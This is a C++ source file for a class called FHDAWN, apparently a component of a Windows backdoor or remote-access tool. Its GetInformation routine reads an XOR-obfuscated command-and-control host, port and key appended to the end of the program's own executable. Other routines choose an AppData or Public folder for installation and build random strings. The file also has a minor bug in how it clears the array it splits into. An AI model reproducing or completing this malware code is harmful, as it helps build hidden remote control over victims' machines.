#include "fhdawn.h"
#include "xor.h"


std::string FHDAWN::readFileContents(const char* file){
	std::stringstream stream;
	std::ifstream outfile(file);
	if(outfile.is_open()){
		stream << outfile.rdbuf();
		return stream.str();
	} else {
		stream << file << " not found : " << GetLastError();
		return stream.str();
	}
}

std::string FHDAWN::Dir()
{
	char DIR[MAX_PATH];
	memset(DIR, '\0', MAX_PATH);
	GetCurrentDirectory(MAX_PATH, DIR);
	return std::string(DIR);
}

void FHDAWN::split(char* src, char* dest[5], const char* delimeter) {
	int i = 0;
	char *p = strtok(src, delimeter);
	while (p != NULL)
	{
		dest[i++] = p;
		p = strtok(NULL, delimeter);
	}	
}

std::string FHDAWN::initial_install_directory(){
	char szPath[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA | CSIDL_FLAG_CREATE, NULL, 0, szPath))){
		return std::string(szPath); // return AppData/Roaming Path
	} else {
	return "C:\\Users\\Public"; // If We are unable to get the AppData/Romaing path, Use Public $HOME folder for installation
	}
}


void FHDAWN::GetInformation()
{
	char* values[3];
	std::ifstream ME(MyLocation().c_str(), std::ios::binary);
	if(ME.is_open()){
		std::string hp = getLastLine(ME);
		memset(values, '\0', 5);
		split((char*)hp.c_str(), values, "^");
		std::string encHost(values[0]);
		std::string encPort(values[1]);
		std::string KEY(values[2]); // plaintext
		Host = XOR(encHost, KEY); 
		Port = XOR(encPort, KEY);
		//return Host + "^" + Port + "^" + KEY;
	}
}


std::istream& FHDAWN::ignoreline(std::ifstream& in, std::ifstream::pos_type& pos)
{
	pos = in.tellg();
	return in.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
}

std::string FHDAWN::getLastLine(std::ifstream& in)
{
	std::ifstream::pos_type pos = in.tellg();

	std::ifstream::pos_type lastPos;
	while (in >> std::ws && ignoreline(in, lastPos))
		pos = lastPos;

	in.clear();
	in.seekg(pos);

	std::string line;
	std::getline(in, line);
	return line;
}

std::string FHDAWN::MyLocation()
{
	TCHAR DIR[MAX_PATH];
	std::string filelocation;
	std::ostringstream err;
	int fpath = GetModuleFileName(NULL, DIR, MAX_PATH);
	if (fpath == 0)
	{
		err.str(""); err.clear();
		err << "Failed to get : " << GetLastError();
		filelocation = err.str();
	}
	else {
		filelocation = DIR;
	}

	return filelocation;

}

std::string FHDAWN::random_string( size_t length )
{
    auto randchar = []() -> char
    {
        const char charset[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
        const size_t max_index = (sizeof(charset) - 1);
        return charset[ rand() % max_index ];
    };
    std::string str(length,0);
    std::generate_n( str.begin(), length, randchar );
    return str;
}
